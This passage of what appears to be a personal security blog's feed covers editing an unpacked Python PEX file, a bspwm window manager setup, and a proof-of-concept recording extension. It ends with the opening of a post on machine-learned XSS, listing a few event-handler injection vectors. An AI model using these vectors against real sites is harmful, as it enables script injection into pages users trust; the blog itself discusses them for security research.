&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;and &lt;strong&gt;__main__.py&lt;/strong&gt; like this&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="n"&gt;__entry_point__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__file__&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;locals&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="vm"&gt;__file__&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;__entry_point__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__loader__&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;locals&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
  &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;zipimport&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;zipimporter&lt;/span&gt;
  &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pkgutil&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ImpLoader&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;hasattr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__loader__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;archive&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;__entry_point__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;__loader__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;archive&lt;/span&gt;
  &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="nb"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__loader__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ImpLoader&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;__entry_point__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__loader__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_filename&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__entry_point__&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Could not launch python executable!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;abspath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;abspath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__entry_point__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.bootstrap&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;_pex.pex_bootstrapper&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;bootstrap_pex&lt;/span&gt;
&lt;span class="n"&gt;bootstrap_pex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__entry_point__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;If you try running the &lt;strong&gt;__main__&lt;/strong&gt; file directly, a error will popup.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="executing"&gt;
&lt;h2&gt;Executing&lt;/h2&gt;
&lt;p&gt;The last two lines of the main script when modified to launch an environment of the executable, the console script can
be invoked as necessary. i.e&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;from _pex.pex_bootstrapper import bootstrap_pex&lt;/span&gt;
&lt;span class="sd"&gt;bootstrap_pex(__entry_point__)&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Call bootstrap_pex_env to set up the required environment&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;_pex.pex_bootstrapper&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;bootstrap_pex_env&lt;/span&gt;
&lt;span class="n"&gt;bootstrap_pex_env&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Call the entry point as you please. In case of coverage entry&lt;/span&gt;
&lt;span class="c1"&gt;# point is coverage.cmdline:main()&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;coverage.cmdline&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;
&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With the modified file, try&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python __main__.py --help

&lt;span class="go"&gt;Coverage.py, version 4.4.2 with C extension&lt;/span&gt;
&lt;span class="go"&gt;Measure, collect, and report on code coverage in Python programs.&lt;/span&gt;

&lt;span class="go"&gt;usage: __main__.py &amp;lt;command&amp;gt; [options] [args]&lt;/span&gt;

&lt;span class="go"&gt;Commands:&lt;/span&gt;
&lt;span class="go"&gt;    annotate    Annotate source files with execution information.&lt;/span&gt;
&lt;span class="go"&gt;    combine     Combine a number of data files.&lt;/span&gt;
&lt;span class="go"&gt;    erase       Erase previously collected coverage data.&lt;/span&gt;
&lt;span class="go"&gt;    help        Get help on using coverage.py.&lt;/span&gt;
&lt;span class="go"&gt;    html        Create an HTML report.&lt;/span&gt;
&lt;span class="go"&gt;    report      Report coverage stats on modules.&lt;/span&gt;
&lt;span class="go"&gt;    run         Run a Python program and measure code execution.&lt;/span&gt;
&lt;span class="go"&gt;    xml         Create an XML report of coverage results.&lt;/span&gt;

&lt;span class="go"&gt;Use &amp;quot;__main__.py help &amp;lt;command&amp;gt;&amp;quot; for detailed help on any command.&lt;/span&gt;
&lt;span class="go"&gt;For full documentation, see https://coverage.readthedocs.io&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, we are free to edit the main program or any dependencies in &lt;strong&gt;.deps&lt;/strong&gt; as we please
and test it. (Try removing *.pyc if your changes are not reflected)&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="recap"&gt;
&lt;h2&gt;Recap&lt;/h2&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Unzip the pex.&lt;/li&gt;
&lt;li&gt;Edit the &lt;tt class="docutils literal"&gt;__main__.py&lt;/tt&gt; to call &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;bootstrap_pex_env(&amp;quot;.&amp;quot;)&lt;/span&gt;&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Call the whichever entrypoint you wish.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="admonition warning"&gt;
&lt;p class="first admonition-title"&gt;Warning&lt;/p&gt;
&lt;p class="last"&gt;Make sure that the python version you are trying to run the &lt;tt class="docutils literal"&gt;__main__.py&lt;/tt&gt; is compatible according to &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;PEX-INFO&lt;/span&gt;&lt;/tt&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="tricks"></category><category term="info"></category><category term="python"></category><category term="reversing"></category></entry><entry><title>Configuring bspwm for my setup</title><link href="https://tunnelshade.in/blog/2017/07/configuring-bspwm/" rel="alternate"></link><published>2017-07-20T00:00:00+05:30</published><updated>2017-07-20T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2017-07-20:/blog/2017/07/configuring-bspwm/</id><summary type="html">&lt;p&gt;After about few months with i3, I stumbled upon &lt;a href="https://github.com/Airblader/i3"&gt;i3gaps&lt;/a&gt; in my quest for some space between the tiling
windows. If you haven't heard or used i3 like window manager, you might prefer &lt;a href="https://tunnelshade.in/blog/2014/05/making-i3-beautiful/"&gt;using it first&lt;/a&gt;.
Soon, I started seeing awesome configurations of &lt;a href="https://www.herbstluftwm.org/index.html"&gt;herbstluftwm&lt;/a&gt; and &lt;a href="https://github.com/baskerville/bspwm"&gt;bspwm&lt;/a&gt;.
Out of these two â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;After about few months with i3, I stumbled upon &lt;a href="https://github.com/Airblader/i3"&gt;i3gaps&lt;/a&gt; in my quest for some space between the tiling
windows. If you haven't heard or used i3 like window manager, you might prefer &lt;a href="https://tunnelshade.in/blog/2014/05/making-i3-beautiful/"&gt;using it first&lt;/a&gt;.
Soon, I started seeing awesome configurations of &lt;a href="https://www.herbstluftwm.org/index.html"&gt;herbstluftwm&lt;/a&gt; and &lt;a href="https://github.com/baskerville/bspwm"&gt;bspwm&lt;/a&gt;.
Out of these two I ended up picking &lt;strong&gt;bspwm&lt;/strong&gt; because of it's simplicity and configurability.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/tunnelshade/awesome-dots/8af7e1fa947206aae6feb1a17d422b59c96c4bb0/screenshots/dirty1.png" class="image-center" alt="Dirty Screen"/&gt;&lt;/p&gt;
&lt;p&gt;Well, in this article, I will follow step by step procedure of setting up bspwm. My &lt;a href="http://github.com/tunnelshade/awesome-dots"&gt;dotfiles&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Outline&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;bspwm is another tiling window manager. It only responds to X events, and messages recevied on a dedicated socket. So we need another program to
listen for our keybindings and forward appropriate commands to this socket. Luckily &lt;strong&gt;bspc&lt;/strong&gt; is a program that writes messages to bspwm's socket.
&lt;strong&gt;sxhkd&lt;/strong&gt; (Simple X hotkey daemon) is an X daemon that can be made to execute commands as reaction to input events. Some configuration files have to be
created from scratch and that is what makes this experience rewarding. Using i3 or similar wm for sometime is recommended before trying bspwm.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Packages to install&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bspwm&lt;/li&gt;
&lt;li&gt;sxhkd&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Optional&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;rofi (application launcher)&lt;/li&gt;
&lt;li&gt;i3lock (screen lock)&lt;/li&gt;
&lt;li&gt;gnome-keyring &amp;amp; libsecret (If you want avoid retyping ssh &amp;amp; gpg passwords in one session)&lt;/li&gt;
&lt;li&gt;compton (compositor)&lt;/li&gt;
&lt;li&gt;feh (set wallpaper)&lt;/li&gt;
&lt;li&gt;yabar (status bar)&lt;/li&gt;
&lt;li&gt;poweline fonts (fancy symbols)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;Steps&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Edit bspwm startup shell script which should be located at &lt;a href="https://github.com/tunnelshade/awesome-dots/blob/50df998c78eca810916c71ea22ce5ccad7706fdb/.config/bspwm/bspwmrc"&gt;&lt;strong&gt;.config/bspwm/bspwmrc&lt;/strong&gt;&lt;/a&gt;
to accomplish the following tasks.&lt;/li&gt;
&lt;li&gt;Start sxhkd, compton, gnome-keyring, set wallpaper and any other startup app.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run some bspc commands to define attributes and create workspaces. (&lt;code&gt;man bspc&lt;/code&gt; or &lt;a href="https://github.com/baskerville/bspwm/wiki/Command-Syntax-Rewrite"&gt;bspc docs&lt;/a&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Now as basic bspwm is setup, let us edit our &lt;a href="https://github.com/tunnelshade/awesome-dots/blob/50df998c78eca810916c71ea22ce5ccad7706fdb/.config/sxhkd/sxhkdrc"&gt;&lt;strong&gt;.config/sxhkd/sxhkdrc&lt;/strong&gt;&lt;/a&gt;
configuration file to define our keybindings for&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Switching focus, swapping nodes, resizing etc... (Some examples here, rest in the configuration file is commented!!).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Close under focus node
super + shift + q
        bspc node -c

super + Return
        termite -e /usr/bin/fish

# Resize
## expand the tiled space in the given direction
super + alt + {h,j,k,l}
        bspc node {@west -r -10,@south -r +10,@north -r -10,@east -r +10}
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Application Launcher.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# I use rofi, see the screenshots for its beauty
# Launcher
super + d
            rofi -show run -font &amp;quot;Monospace Bold 16&amp;quot; -m -1 -fullscreen -padding 300 -hide-scrollbar
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Multimedia keys.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Functional key bindings
# I use mpd, so mpc can be used to switch music tracks
XF86Audio{Stop,Prev,Next,Play}
        mpc {stop,prev,next,toggle}

# xbacklight has to be installed
XF86MonBrightness{Up,Down}
        xbacklight {-inc 10,-dec 10}

# Using ALSA as it is present by default in most cases
XF86Audio{Raise,Lower}Volume
        amixer sset Master {5%+,5%-}

XF86AudioMute
        amixer sset Master toggle
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Using a status bar helps, I use &lt;a href="https://github.com/geommer/yabar"&gt;yabar&lt;/a&gt; and
&lt;a href="https://github.com/tunnelshade/awesome-dots/blob/50df998c78eca810916c71ea22ce5ccad7706fdb/.config/yabar/yabar.conf"&gt;my config&lt;/a&gt;. Helper scripts are present in &lt;code&gt;scripts&lt;/code&gt;
directory.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Wondering when we will start &lt;code&gt;nm-applet&lt;/code&gt; and other system tray items?? I don't! I switched to using &lt;code&gt;nmtui&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;Beautification&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The key to beauty is &lt;strong&gt;font&lt;/strong&gt;, &lt;strong&gt;colorscheme&lt;/strong&gt; and a complimenting &lt;strong&gt;wallpaper&lt;/strong&gt;. I use &lt;code&gt;Fira Mono for Powerline&lt;/code&gt;, &lt;code&gt;FontAwesome&lt;/code&gt; &amp;amp; &lt;code&gt;gruvbox&lt;/code&gt; colorscheme. Use
&lt;a href="http://terminal.sexy/"&gt;&lt;strong&gt;terminal.sexy&lt;/strong&gt;&lt;/a&gt; to get some colorschemes that can be exported in suitable format for almost &lt;strong&gt;all terminal emulators&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Next up are out ugliest component i.e GTK Apps :P. Instead of editing configuration files directly, I highly recommend &lt;strong&gt;lxappearance&lt;/strong&gt;, which has
absolutely no dependencies! Use it set your GTK, Icon &amp;amp; Cursor theme. GTK themes are picked from &lt;strong&gt;~/.themes&lt;/strong&gt; &amp;amp; remaining from &lt;strong&gt;~/.icons&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use some cool theme and even now, if the buttons are ugly make sure that you have the required &lt;strong&gt;gtk-engine&lt;/strong&gt; installed. For instance, I use &lt;strong&gt;Zukwito&lt;/strong&gt;,
so I need &lt;strong&gt;gtk-engine-murrine&lt;/strong&gt;. Now, your gtk apps must be cool as in any other DE.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;Screenshots&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/tunnelshade/awesome-dots/8af7e1fa947206aae6feb1a17d422b59c96c4bb0/screenshots/dirty2.png" class="image-center" alt="Dirty Screen"/&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://raw.githubusercontent.com/tunnelshade/awesome-dots/8af7e1fa947206aae6feb1a17d422b59c96c4bb0/screenshots/multi_monitor.jpg"&gt;Multi Monitor Screenshot&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Other Apps&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A list of applications that I use&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Type&lt;/th&gt;
&lt;th&gt;: Application&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Window Manager&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: bspwm&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Broswer&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: firefox&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Terminal&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: termite&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Shell&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: fish&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Editor&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: vim&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Music Player&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: mpd/ncmpcpp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Video Player&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: mpv&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Launcher&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: rofi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IRC Client&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: weechat&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;GTK Theme&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: zukwito&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Icon Theme&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;: faenza&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;PS&lt;/strong&gt;: Don't forget to push your dotfiles to github so that anyone else can use those.&lt;/p&gt;</content><category term="tricks"></category><category term="info"></category></entry><entry><title>Pocuito - A little web extension</title><link href="https://tunnelshade.in/blog/2016/12/pocuito-extension/" rel="alternate"></link><published>2016-12-01T00:00:00+05:30</published><updated>2016-12-01T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2016-12-01:/blog/2016/12/pocuito-extension/</id><summary type="html">&lt;p&gt;One of the main issues people face in web application based organizations is the &lt;strong&gt;channel of communication between the
security team and developers&lt;/strong&gt;. This often involves &lt;strong&gt;lengthy steps for reproduction of vulnerabilities&lt;/strong&gt;. Often times
these are tedious to follow let alone repeat multiple times for the pentesters. So, I was â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;One of the main issues people face in web application based organizations is the &lt;strong&gt;channel of communication between the
security team and developers&lt;/strong&gt;. This often involves &lt;strong&gt;lengthy steps for reproduction of vulnerabilities&lt;/strong&gt;. Often times
these are tedious to follow let alone repeat multiple times for the pentesters. So, I was behind a solution to this problem.
&lt;a href="https://blog.mozilla.org/security/2014/01/20/reporting-web-vulnerabilities-to-mozilla-using-zest/"&gt;Mozilla ZEST&lt;/a&gt; is something
that I have known for a while. &lt;strong&gt;ZEST&lt;/strong&gt; allows to replay requests and some assert statements. The serious &lt;em&gt;limitation of this
approach is in modern day web applications which need complex user interactions on the interface&lt;/em&gt;.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;To encounter the above limitation I assumed the logical way is to use &lt;strong&gt;a browser extension to record/replay user
interactions like clicks and input fills&lt;/strong&gt;. The stringent rules on web extensions in chrome don't allow you to read/tamper
requests. Hence, the hybrid solution is to use a proxy and write an extension that makes use of that proxy to tamper &amp;amp; record
required requests.&lt;/p&gt;
&lt;h4&gt;Pocuito&lt;/h4&gt;
&lt;p&gt;Pocuito is a two part solution.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extension that you install on your browser.&lt;/li&gt;
&lt;li&gt;Proxy server which can be deployed for multiple users inside your org network.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTE: The proxy maintains session based on the &lt;code&gt;remote_ip&lt;/code&gt; it sees the request from, hence use it from local network&lt;/strong&gt;&lt;/p&gt;
&lt;h4&gt;Download&lt;/h4&gt;
&lt;p&gt;You can download the extension &amp;amp; proxy on &lt;a href="https://github.com/tunnelshade/pocuito/releases"&gt;Github Releases&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Usage&lt;/h4&gt;
&lt;p&gt;I highly suggest going through the &lt;a href="https://github.com/tunnelshade/pocuito"&gt;README&lt;/a&gt; which will stay updated all the time.&lt;/p&gt;</content><category term="tools"></category></entry><entry><title>Teaching XSS to a machine</title><link href="https://tunnelshade.in/blog/2016/03/teaching-xss-to-machine/" rel="alternate"></link><published>2016-03-26T00:00:00+05:30</published><updated>2016-03-26T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2016-03-26:/blog/2016/03/teaching-xss-to-machine/</id><summary type="html">&lt;p&gt;Even before we start anything, just have a glance at few interesting vectors that were dreamt by a machine learning agent which has structural
knowledge of HTML. Few vectors require user interaction also. I tried to add comments about what I think is special about few of those.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="na"&gt;onblur â€¦&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Even before we start anything, just have a glance at few interesting vectors that were dreamt by a machine learning agent which has structural
knowledge of HTML. Few vectors require user interaction also. I tried to add comments about what I think is special about few of those.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="na"&gt;onblur&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;x&lt;/span&gt; &lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="na"&gt;onerror&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;svg&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="na"&gt;onfocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;import&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="c"&gt;&amp;lt;!-- When the svg is clicked, the js fails and body onerror is triggered. WOW!! --&amp;gt;&lt;/span&gt;
